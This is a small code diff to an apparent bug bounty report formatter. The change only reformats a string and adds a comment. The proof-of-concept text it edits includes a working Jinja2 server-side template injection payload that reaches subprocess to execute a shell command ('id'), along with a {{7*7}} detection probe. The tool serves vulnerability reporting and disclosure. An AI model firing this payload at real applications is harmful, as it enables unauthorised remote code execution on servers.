@@ -1,3 +1,4 @@
+# complexity_justified: bounty reporting keeps severity mappings and narrative formatting together for operator-grade output.
 from __future__ import annotations
 """
 Singularity Works — Bug Bounty Report Formatter v1.0
@@ -404,7 +405,10 @@ def _generate_poc(code: str, message: str, evidence: dict) -> list[str]:
         return [
             "Locate the parameter that accepts template input",
             "Submit: `{{7*7}}` — if the response contains `49`, SSTI is confirmed",
-            "Escalate: `{{config.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}`",
+            (
+                "Escalate: `{{config.__class__.__mro__[1].__subclasses__()"
+                "[408]('id',shell=True,stdout=-1).communicate()}}`"
+            ),
             "Modify subprocess index as needed for Python version",
         ]
     if "ssrf" in code_l:
